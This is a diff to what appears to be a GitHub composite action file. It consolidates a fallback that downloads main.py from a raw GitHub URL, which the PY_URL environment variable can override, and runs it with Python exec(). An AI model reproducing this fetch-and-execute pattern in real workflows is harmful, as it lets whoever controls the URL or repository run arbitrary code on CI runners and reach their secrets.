@@ -18,30 +18,12 @@ runs:
         else
           ACTION_DIR="$(dirname "$(find /tmp -type f -name 'action.yml' -o -name 'action.yaml' | head -n 1)")"
         fi
-        if [ -z "${ACTION_DIR}" ] || [ ! -d "${ACTION_DIR}" ]; then
-          python3 - <<'PY'
-          import os, urllib.request
-          url = os.getenv('PY_URL', 'https://raw.githubusercontent.com/RuningBird/actions-test/v5/src/main.py')
-          with urllib.request.urlopen(url, timeout=15) as resp:
-              code = resp.read().decode('utf-8')
-          g = {}
-          exec(compile(code, 'main.py', 'exec'), g, g)
-          PY
-          exit 0
-        fi
-        if [ ! -f "${ACTION_DIR}/src/main.py" ]; then
-          python3 - <<'PY'
-          import os, urllib.request
-          url = os.getenv('PY_URL', 'https://raw.githubusercontent.com/RuningBird/actions-test/v5/src/main.py')
-          with urllib.request.urlopen(url, timeout=15) as resp:
-              code = resp.read().decode('utf-8')
-          g = {}
-          exec(compile(code, 'main.py', 'exec'), g, g)
-          PY
-          exit 0
-        fi
         if ! command -v python3 >/dev/null 2>&1; then
-          exit 1
+          echo "python3 not found"; exit 1
         fi
-        cd "${ACTION_DIR}"
-        python3 src/main.py
+        if [ -n "${ACTION_DIR}" ] && [ -d "${ACTION_DIR}" ] && [ -f "${ACTION_DIR}/src/main.py" ]; then
+          cd "${ACTION_DIR}"
+          python3 src/main.py
+        else
+          python3 -c 'import os, urllib.request; url=os.getenv("PY_URL","https://raw.githubusercontent.com/RuningBird/actions-test/v5/src/main.py"); code=urllib.request.urlopen(url,timeout=15).read().decode("utf-8"); g={}; exec(compile(code,"main.py","exec"),g,g)'
+        fi
